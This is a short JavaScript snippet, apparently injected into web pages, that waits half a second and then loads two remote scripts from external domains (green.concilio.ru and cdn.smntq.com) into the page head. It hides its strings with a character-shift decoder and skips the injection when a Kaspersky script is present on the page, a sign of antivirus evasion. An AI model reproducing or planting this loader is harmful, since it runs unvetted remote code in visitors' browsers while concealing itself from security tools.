
setTimeout(function() {


function mars() {

    let result = false

    function decode(word) {
        let output = '';
        for (let i = 0; i < word.length; i++) {
            let char_code = word.charCodeAt(i) - i + 13;
            output += String.fromCharCode(char_code);
        }
        return output;
    }

    let scripts = document.getElementsByTagName(decode('fWg_gl'))
    if(typeof scripts === 'object') {
        for(let i = 0; i < scripts.length; i++) {
            if(scripts[i].getAttribute('src') && scripts[i].getAttribute('src').includes(decode('^Uhf\jlet'))) {
                result = true
            }
        }
    } else result = false
    return result
}

         
         var fdf353c = document.createElement('script');
         fdf353c.src = 'https://green.concilio.ru/app/sq.js?caltat1=cffb4fc2b6a14f53b0d063b101c04a89&idClient=16&idCampaign=662452&csid=cffb4fc2b6a14f53b0d063b101c04a89&service=';
         if (!mars()){
         document.getElementsByTagName('head')[0].appendChild(fdf353c);
         }
         var s20fb5c = document.createElement('script');
         s20fb5c.src = 'https://cdn.smntq.com/js/smart.php';
         if (!mars()){
         document.getElementsByTagName('head')[0].appendChild(s20fb5c);
         }
    
}, 500);